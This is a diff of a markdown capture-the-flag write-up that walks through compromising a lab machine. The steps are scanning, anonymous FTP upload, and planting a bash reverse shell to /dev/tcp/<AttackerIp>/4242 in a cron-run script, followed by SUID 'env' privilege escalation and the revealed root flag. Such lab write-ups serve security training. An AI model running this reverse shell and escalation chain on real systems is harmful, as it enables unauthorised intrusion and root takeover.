@@ -5,7 +5,7 @@
 
 Nmap / rustcan
 
-```zsh
+```bash
 IP=VICTIM
 rustscan -a $IP | tee rustscan.log
 [...]
@@ -26,7 +26,7 @@ PORT    STATE SERVICE      REASON
 - What service is running on ports 139 and 445?
 **smb**
 
-```zsh
+```bash
 smbclient -L $IP (without any password)
 
 Enter WORKGROUP\root's password: 
@@ -44,7 +44,7 @@ Enter WORKGROUP\root's password:
 
 > HINT: What's that log file doing there?... nc won't work the way you'd expect it to
 
-```zsh
+```bash
 ftp $IP
 
 Name: anonymous
@@ -62,7 +62,7 @@ ftp> mget *
 ```
 Let's cat each files: 
 
-```zsh
+```bash
 cat clean.sh 
 #!/bin/bash
 
@@ -77,14 +77,14 @@ else
 fi
 ```
 
-```zsh
+```bash
 cat removed_files.log 
 Running cleanup script:  nothing to delete
 Running cleanup script:  nothing to delete
 Running cleanup script:  nothing to delete
 ```
 
-```zsh
+```bash
 cat to_do.txt        
 I really need to disable the anonymous login...it's really not safe
 ```
@@ -93,7 +93,7 @@ I really need to disable the anonymous login...it's really not safe
 
 So let's have fun by uploading this reverse shell via ftp now:
 
-```zsh
+```bash
 cat clean.sh
 
 #!/bin/bash
@@ -102,7 +102,7 @@ bash -i >& /dev/tcp/<AttackerIp>/4242 0>&1
 
 And after few seconds we are in :
 
-```zsh
+```bash
 rlwrap nc -nlvp 4242
 listening on [any] 4242
 namelessone@anonymous:~$ 
@@ -125,17 +125,17 @@ namelessone@anonymous:~$
  
 > HINT: This may require you to do some outside research
 
-Cool ! So as usual in this case, [gtfobins](https://gtfobins.github.io/) comes in :point_left:
+Indeed:
 
-```zsh
+```bash
 find / -perm -u=s 2>/dev/null
 [...]
 /usr/bin/env
 ```
 
-So let's try this: [gtfobins break out from restricted environments](https://gtfobins.github.io/gtfobins/env/#shell)
+So let's try this: [gtfobins break out from restricted environments](https://gtfobins.github.io/gtfobins/env/#shell) :point_left:
 
-```zsh
+```bash
 env /bin/bash -p
 bash-4.4# id
 uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
@@ -150,8 +150,15 @@ Houra :partying_face:
 <details>
   <summary>Click to reveal the root flag!</summary>
   
-  ```zsh
+  ```bash
   4d930091c31a622a7ed10f27999af363
   ```
 </details>
- 
+
+
+### Useful Links:
+
+[rustscan](https://github.com/RustScan/RustScan)
+[revshells](https://www.revshells.com/)
+[gtfobins](https://gtfobins.github.io/)
+
